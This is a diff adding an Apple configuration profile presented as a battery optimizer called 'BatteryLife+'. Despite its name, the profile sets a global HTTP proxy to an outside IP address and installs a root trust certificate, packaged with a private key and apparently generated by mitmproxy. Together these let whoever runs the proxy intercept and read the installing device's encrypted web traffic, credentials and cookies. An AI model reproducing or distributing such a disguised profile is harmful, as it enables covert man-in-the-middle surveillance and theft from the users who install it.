@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.proxy.http.global</string>
+            <key>PayloadDisplayName</key>
+            <string>Battery Optimizer Engine</string>
+            <key>PayloadIdentifier</key>
+            <string>com.battlife.proxy.2eae0daf-04c6-486b-bd72-0de18cffbb6e</string>
+            <key>PayloadUUID</key>
+            <string>2eae0daf-04c6-486b-bd72-0de18cffbb6e</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>ProxyServer</key>
+            <string>82.77.80.56</string>
+            <key>ProxyServerPort</key>
+            <integer>8888</integer>
+            <key>ProxyType</key>
+            <string>Manual</string>
+        </dict>
+        <dict>
+            <key>PayloadType</key>
+            <string>com.apple.security.root</string>
+            <key>PayloadDisplayName</key>
+            <string>BatteryLife+ Trust Certificate</string>
+            <key>PayloadIdentifier</key>
+            <string>com.battlife.cert.b8af06ba-0545-49a5-a4f4-5f3044521115</string>
+            <key>PayloadUUID</key>
+            <string>b8af06ba-0545-49a5-a4f4-5f3044521115</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadContent</key>
+            <data>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBcnVwQXJ2VUc1OStsOHpTdjdIa01DajZtUmc3SFFidnJPVzVXcm9vRnZkUVJodFJKCjc5WGlCRXJGV3RvRlYxUTZ6anVIYmR1NHhDMHhzdDg5YitReWZmTmFWTHZMM0VwK1cyVUR2aUt5YVJPdWF3clYKSlVMR3hLL3Fobk9sdHpDbmNTaGRFakJtWEd4VTNJejlLRjk5UGVha1gxQlhTT2svSlM5aGxXR2t4ODhkSjh0RAphVE9lRnlUdlRCUEJ4V1pJNzJ4eVVqaUI5MGZsZVVqeDhmc3Z4K3JQbWdvZjNWL1ZCSkszL2w4eHZMWFgxcGRPCjhBRjRheGIvbVR1amVXckxtN0ZqZmE1QzdxRng4NnozQVpXVW9kdllDVFB1NzJaOGJldWFzc25CNnVmalYvb1oKZzdqdThmU2dYZUl1Qml2L1QyblVoWW5VbXM2OXYrZ1dhTmwzNlFJREFRQUJBb0lCQUIvUllmSFJoYStSU2QwNwpWTk1sMDlCYlJDRFRXR0MzUDl0REhJYUVlZlhsaVVpbS9rb2Y5SXpHVXk4cklMU1prRmJxa2tDa0t2Q1lyZ1UxClFiWkVZd0R4VHhuQnpad2xldVhDTXRPWCtTOVBFcmZMRVNuRmcyWE5BRkx6MzQyNnpvS3hqbmljRUVxNHRCa28KbG5hTkpEbXA1bldtSmpLUHAxcHF5NHdDWnBpbjRZR041RmdqNDBQcXJBeTJtak9kTENWcTlHN1VscEtNcDF2VQpzRDdCOUdHK1ozSzlqMGpBS0hoaERZaEtCQWE1WDNoYkhtbkpyR09oTkpVN3Q2VEVqaDhpdlRYOGRjNVNWY3N4ClR1cUx4OEtRWEtBTVhTUVN2VE5GOUxaaUhtMVZRdVJaUXJET0pUckRQQzRPR3VDMktSaUxMY3FCWWNGWHV6aEEKcjZpVnNZY0NnWUVBNTFMSS9TVG4vUm8rK20vQ1pZQktGNS9hbGo2aUZKbkkvNmFzcnlTODhnQmFZNUdrOWRhZgpwWHhMcVBxYU1acGN4RkwzYVI5VDJjTStZYVovSHFZeU12b1pidHhaeUNmeGdOQzI2RUtFckZDT2xETC9Ldko3CnBaM3VEZG9GNnZkWkVGOFpZdGEvM3Q3VGx3NUZPSHBtYWlXOTVxWmJCTElNdlhQRytuVnZ6WnNDZ1lFQXdaTUMKNWo3M0JpcDZUeHRVVmh6eU1ldS9JVEhQd08xMlJHcEhaUk00MDdIV1ZpdGF0M1Q2SGdVSGQwTkJmUGVOaFphKwp2L0syV3hUeEduR2o0VnNsWVNrSUtOYkRqcTBoWXJZQU9SNEhuUTRqemtVQzNmdTlKZEI0WVhPZHdvcWt3VGpDClU4bVJuS3BzYStGWmlHakhoN245dkxtY1dDMWJMdWdZZW9iQ0tzc0NnWUVBdk9vYy9xL3ZUZ0xyUC9lWm1POUcKa3ppWGVYQTVTZjIxNnlNaGovKysxeHgydFM0eXZCckZVbzdKODN5R0JOQjl4ay9EZ25SMU5EaUJiNXBiNHBuMApFVEd6SjVpSk1pOTh5YWlxVjlCTExiYTBXayt6bUUxanNZUGk4Q2tJQURaMDVDdm1QWlFJS21sci84ZEZ2TFFwCmc3TEMvZVVLSERHVXVmd2RtbG5pTHRVQ2dZRUFxRXA0ZmRhR0NyMUpZcGNmQmxMYUdaNmNwMjVYOGFKQmJROTkKREpuZWtPV09zNUd6cDhXeVlnRDdVYXVPTnVnK0NNTmJDU1FwZUJ4SDFUYXhSSTVxZkFNaFRlZ1JVbXlnbHVJbQpaWUgvR29NZGpBb2hpUDZBbm15VkRCeHBMcVk4d0tQcEJ0RTZvQnJtY2hBVU4rem9jODYyazZwSEM3NDdCUmZSCm1FeXFhR3NDZ1lBZmx3UllTL1YyQUx4Z3FEcG91Y0ZRN25DT1RsZjcwQnArMnZYVzRmUWExT2dRcHVJbHBZai8KcWE4dXNSejdEY0ZwY0J6bFpiZStvK2h0YjVzTFRMSmNKWHJnOUw0WFFHTEVOWm8rdyt5U3k1QlNwRlozWUc4MgpJaDM2NmVyWGs5K0EwVjhXL3ltNjVGK21MYm92bmhwc25xem5HVWJ6MXl2Q043L1ZEcnVyaEE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQotLS0tLUJFR0lOIENFUlRJRklDQVRFLS0tLS0KTUlJRE5UQ0NBaDJnQXdJQkFnSVVZTmJHbENjUE56TG9DR2FZUEl1d3ZHN040SEV3RFFZSktvWklodmNOQVFFTApCUUF3S0RFU01CQUdBMVVFQXd3SmJXbDBiWEJ5YjNoNU1SSXdFQVlEVlFRS0RBbHRhWFJ0Y0hKdmVIa3dIaGNOCk1qWXdOREF4TVRJeE5EUTFXaGNOTXpZd016TXhNVEl4TkRRMVdqQW9NUkl3RUFZRFZRUUREQWx0YVhSdGNISnYKZUhreEVqQVFCZ05WQkFvTUNXMXBkRzF3Y205NGVUQ0NBU0l3RFFZSktvWklodmNOQVFFQkJRQURnZ0VQQURDQwpBUW9DZ2dFQkFLN3FRSzcxQnVmZnBmTTByK3g1REFvK3BrWU94MEc3NnpsdVZxNktCYjNVRVliVVNlL1Y0Z1JLCnhWcmFCVmRVT3M0N2gyM2J1TVF0TWJMZlBXL2tNbjN6V2xTN3k5eEtmbHRsQTc0aXNta1RybXNLMVNWQ3hzU3YKNm9aenBiY3dwM0VvWFJJd1pseHNWTnlNL1NoZmZUM21wRjlRVjBqcFB5VXZZWlZocE1mUEhTZkxRMmt6bmhjawo3MHdUd2NWbVNPOXNjbEk0Z2ZkSDVYbEk4Zkg3TDhmcXo1b0tIOTFmMVFTU3QvNWZNYnkxMTlhWFR2QUJlR3NXCi81azdvM2xxeTV1eFkzMnVRdTZoY2ZPczl3R1ZsS0hiMkFrejd1OW1mRzNybXJMSndlcm40MWY2R1lPNDd2SDAKb0YzaUxnWXIvMDlwMUlXSjFKck92Yi9vRm1qWmQra0NBd0VBQWFOWE1GVXdEd1lEVlIwVEFRSC9CQVV3QXdFQgovekFUQmdOVkhTVUVEREFLQmdnckJnRUZCUWNEQVRBT0JnTlZIUThCQWY4RUJBTUNBUVl3SFFZRFZSME9CQllFCkZJWHJLamczNXZ3d013YS9vZXp0bVJhM2tIeHdNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUF5TXpvZ1BUckEKaWwxM1lJVW9vVFpKYTRJSlp5VGNrc1dZS3BkQzdNaUNoMVlNckVhaEpZU2V2ZTVxaW9wbnFxV0x1RTdMdW4xNQpDSnoyR3kyR29CLzMxNEhFc3RMWWNtNDhyYW9aRCtJWW9VbHBmazJnNlhjTHhaNGZYT1poZFFOamtxY2V6ZExYCld6TEw5V0RLU1RrMUxuVlNUV2JENVViaFBvWWI1WGxSZU10cVNJOVZJbkw1Wjd0OEVmaGthSXBBK0VmNHltemQKL2hkU1YyUEhRSHVOTHBjc29BVWFnSEVSdGl2Zlc4T0lkVy9Sc0RYeldkeGZ2cFpqdXY4WkZLaXVVZWdKZHZOLwpKcVdJa0w0WFFhWXdUelZXUktjZ3hOcU5RcldWM3RRRU52eEVUYXlucVVkSTlqQXgxN2czb2RoMS9iSTRRaS9ICmpLaG1FeXRBRDZaTAotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==</data>
+        </dict>
+    </array>
+    <key>PayloadDisplayName</key>
+    <string>BatteryLife+</string>
+    <key>PayloadIdentifier</key>
+    <string>com.battlife.profile.ec81cc6c-5486-4f42-a4d9-7504b9f25346</string>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>ec81cc6c-5486-4f42-a4d9-7504b9f25346</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+</dict>
+</plist>
